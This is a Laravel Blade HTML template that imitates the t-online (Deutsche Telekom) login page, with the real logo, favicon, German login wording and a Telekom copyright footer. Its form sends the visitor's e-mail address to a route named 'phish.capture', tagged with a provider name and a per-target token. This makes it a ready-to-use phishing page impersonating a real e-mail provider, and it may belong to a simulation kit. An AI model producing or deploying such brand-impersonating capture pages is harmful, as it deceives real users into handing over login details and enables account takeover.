<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>t-online Login</title>
    <link rel="icon" href="https://www.t-online.de/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Roboto,Arial,sans-serif;background:#f7f9fc;min-height:100vh;display:flex;flex-direction:column}
        header{background:#fff;padding:16px 32px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 0 #e0e0e0}
        .logo img{height:24px;width:auto}
        nav{display:flex;gap:24px;align-items:center}
        nav a{font-size:14px;color:#171b26;text-decoration:none;font-weight:500}
        nav a:hover{color:#e20074}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
        .login-box{width:100%;max-width:400px}
        h1{font-size:40px;font-weight:700;color:#171b26;margin-bottom:8px;line-height:48px}
        .subtitle{font-size:16px;color:#171b26;margin-bottom:32px}
        .input-group{margin-bottom:16px}
        .input-group label{display:block;font-size:14px;color:#171b26;margin-bottom:6px;font-weight:400}
        .input-group input{width:100%;height:48px;padding:12px 34px 12px 44px;font-size:16px;font-family:Roboto,sans-serif;color:#171b26;background:#f7f9fc;border:1px solid #cfd5e5;border-radius:8px;outline:none;transition:border-color .15s}
        .input-group input:focus{border-color:#e20074;box-shadow:0 0 0 2px rgba(226,0,116,.1)}
        .input-group input::placeholder{color:#999}
        .btn-anmelden{width:100%;height:48px;background:#e20074;color:#fff;border:1px solid #e20074;border-radius:8px;font-size:14px;font-weight:500;font-family:Roboto,sans-serif;cursor:pointer;transition:background .15s}
        .btn-anmelden:hover{background:#c8006a}
        .links{display:flex;justify-content:space-between;margin-top:16px}
        .links a{font-size:13px;color:#e20074;text-decoration:none}
        .links a:hover{text-decoration:underline}
        .footer{padding:16px 32px;text-align:center;font-size:11px;color:#999;border-top:1px solid #e0e0e0;background:#fff}
        @media(max-width:480px){.main{padding:24px 16px}h1{font-size:28px;line-height:36px}}
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <img src="https://www.t-online.de/s/paper/_next/static/media/t-online-desktop.327ab976.svg" alt="t-online">
        </div>
        <nav>
            <a href="#">E-Mail</a>
            <a href="#">Hilfe</a>
        </nav>
    </header>

    <div class="main">
        <div class="login-box">
            <h1>Willkommen</h1>
            <p class="subtitle">Melden Sie sich mit Ihrem t-online Konto an.</p>

            <form action="{{ route('phish.capture', ['provider' => 'telekom', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="input-group">
                    <label for="email">E-Mail-Adresse</label>
                    <input type="email" id="email" name="email" placeholder="E-Mail-Adresse" value="{{ $email }}" autocomplete="username">
                </div>

                <button type="submit" class="btn-anmelden">Anmelden</button>
            </form>

            <div class="links">
                <a href="#">Passwort vergessen?</a>
                <a href="#">Hilfe</a>
            </div>
        </div>
    </div>

    <div class="footer">© 2026 Deutsche Telekom AG</div>
</body>
</html>
